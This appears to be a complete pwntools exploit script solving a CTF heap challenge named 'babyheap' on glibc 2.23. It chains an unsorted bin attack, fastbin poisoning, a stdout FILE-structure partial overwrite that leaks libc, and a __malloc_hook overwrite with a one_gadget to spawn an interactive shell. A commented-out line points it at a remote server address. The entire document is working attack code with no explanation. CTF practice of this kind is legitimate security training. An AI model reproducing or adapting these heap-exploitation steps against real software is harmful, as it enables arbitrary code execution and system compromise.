from pwn import *

libc = ELF('./libc.so.6')

context.arch = 'amd64'

def add(idx, size, content):
	r.sendlineafter('>>', '1')
	r.sendlineafter(':', str(idx))
	r.sendlineafter(':', str(size))
	r.sendafter(':', content)

def edit(idx, content):
	r.sendlineafter('>>', '2')
	r.sendlineafter(':', str(idx))
	r.sendafter(':', content)

def free(idx):
	r.sendlineafter('>>', '3')
	r.sendlineafter(':', str(idx))

def DEBUG():
	gdb.attach(r)


#r = process('./babyheap')
r = process(['./ld-2.23.so', '--library-path',  './',  './babyheap'])
#r = remote('51.158.118.84', 17001)

add(0, 0x60, '\x00'*0x50+flat(0, 0x71))
add(1, 0x100, 'c')
add(2, 0x60, 'd')

# unsorted bin attack
free(1) #1
edit(1, p64(0) + '\xe8\x87')
add(3, 0x100, 'd')
free(1) #2

# get fake chunk
free(0) #3
free(2) #4
edit(2, '\x60')
add(4, 0x60, 'e')
add(5, 0x60, flat(0, 0x71))

# leak
free(0) #5
free(2) #6
edit(2, '\x70')
edit(1, '\xdd\x75')
add(6, 0x60, 'a')
add(7, 0x60, 'b')
add(8, 0x60, '\x00'*0x33 + flat(0xfbad3c80, 0, 0, 0)+'\x00')
libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x3c5600
print "libc_base @ ", hex(libc_base)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print "malloc_hook @ ", hex(malloc_hook)
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_shot = libc_base + one_gadget[1]
target = malloc_hook - 0x23
print "target @ ", hex(target)

# overwrite malloc_hook to one_shot
free(2) #7
edit(2, p64(target))
add(9, 0x60, 'f')
add(10, 0x60, '\x00'*0x13+p64(one_shot))

r.sendlineafter('>>', '1')
r.sendlineafter(':', '11')
r.sendlineafter(':', str(0x60))

r.interactive()
